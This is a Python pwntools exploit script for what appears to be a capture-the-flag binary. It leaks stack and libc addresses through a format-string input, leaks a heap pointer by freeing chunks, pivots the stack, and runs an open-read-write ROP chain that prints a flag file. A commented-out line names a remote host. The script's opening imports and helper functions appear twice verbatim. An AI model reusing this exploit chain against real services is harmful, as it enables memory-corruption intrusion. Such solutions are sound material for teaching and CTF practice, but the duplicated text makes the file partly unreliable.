#! /usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux', log_level='debug')

# p = process('./pwn', env={'LD_PRELOAD': 'libc6_2.23-0ubuntu11.2_amd64.so'})
p = process('./pwn')
# p = remote('123.56.52.128',  10012)
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')


def login(payload):
    p.sendafter('NAME: ', payload)


def add(payload):
    p.sendlineafter('CHOICE :', '2')
    p.sendafter('cnt:', payload)
#! /usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux', log_level='debug')

# p = process('./pwn', env={'LD_PRELOAD': 'libc6_2.23-0ubuntu11.2_amd64.so'})
p = process('./pwn')
# p = remote('123.56.52.128',  10012)
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')


def login(payload):
    p.sendafter('NAME: ', payload)


def add(payload):
    p.sendlineafter('CHOICE :', '2')
    p.sendafter('cnt:', payload)


def delete(idx):
    p.sendlineafter('CHOICE :', '3')
    p.sendlineafter('idx:', str(idx))


def show(idx):
    p.sendlineafter('CHOICE :', '4')


def gift(payload):
    p.sendlineafter('CHOICE :', '23333')
    p.sendafter('Please input what you want:', payload)


def info():
    p.sendlineafter('CHOICE :', '1')


def menu(idx):
    p.sendlineafter('CHOICE :', str(idx))


if __name__ == "__main__":
    login('%p%p\n')
    info()
    p.recvuntil('0x')
    stack = eval('0x' + p.recv(12)) + 0x2660
    p.recvuntil('0x')
    libc_base = eval('0x' + p.recv(12)) - 0x3c6780
    success('libc: ' + str(hex(libc_base)))

    pop_rdi_ret = 0x0000000000021102 + libc_base
    pop_rsi_ret = 0x00000000000202e8 + libc_base
    pop_rdx_ret = 0x0000000000001b92 + libc_base
    open_ = 0x0f7030 + libc_base
    write_ = 0x00000000000fcfd0 + libc_base
    read_ = 0x0f7250 + libc_base
    leave_ret = 0x0000000000042351 + libc_base
    strncmp = libc_base + 0x000000000008bb20

    payload =  p64(0) + p64(0) + p64(stack)
    payload += p64(pop_rdi_ret) + p64(0)
    payload += p64(pop_rsi_ret) + p64(stack)
    payload += p64(pop_rdx_ret) + p64(0x100)
    payload += p64(read_)
    payload += p64(leave_ret)

    orw =  p64(0)
    orw += p64(pop_rdi_ret) + p64(stack + 0xb0)
    orw += p64(pop_rsi_ret) + p64(0)
    orw += p64(open_)
    orw += p64(pop_rdi_ret) + p64(3)
    orw += p64(pop_rsi_ret) + p64(stack + 0x100)
    orw += p64(pop_rdx_ret) + p64(0x50)
    orw += p64(read_)
    orw += p64(pop_rdi_ret) + p64(1)
    orw += p64(pop_rsi_ret) + p64(stack + 0xa0)
    orw += p64(pop_rdx_ret) + p64(1)
    orw += p64(write_)
    orw += p64(stack + 0x100) + p64(0x50)
    orw += './flag\x00\x00'

    # gdb.attach(p, 'b *%s\n'%(str(hex(write_))))
    add(payload + '\n')
    add('a' * 7 + '\n')
    delete(1)
    delete(0)
    show(0)
    p.recvuntil('idx 1:')
    heap = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) - 0x70 + 0x20
    success('HEAP: ' + str(hex(heap)))
    success('libc: ' + str(hex(libc_base)))
    success('stack: ' + str(hex(stack)))

    # gdb.attach(p, 'b *$rebase(0x132A)\n')
    # gdb.attach(p, 'b *%s\n'%(str(hex(pop_rdi_ret))))
    menu(23333)
    payload = 'a' * 0x20 + p64(heap)
    p.sendafter('INPUT:', payload)

    p.sendline(orw)

    p.interactive()